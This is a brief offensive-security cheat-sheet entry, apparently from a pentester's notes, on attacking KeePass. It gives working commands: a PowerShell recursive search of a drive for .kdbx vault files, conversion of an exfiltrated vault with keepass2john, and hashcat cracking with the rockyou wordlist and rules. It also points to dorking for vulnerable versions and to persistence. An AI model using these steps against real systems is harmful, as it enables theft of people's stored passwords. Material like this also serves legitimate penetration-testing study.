# Hacking KeePass


#### Exfiltrate .kdbx and crack


KeePass - [https://keepass.info/](https://keepass.info/) 
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
# Exfiltrated
keepass2john Database.kdbx > keepass.hash
# And crack with Hashcat
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

#### Otherwise..

[[Search-Engine-Dorking]] for vulnerable versions

[[Persistence]]

## References

[https://keepass.info/](https://keepass.info/) 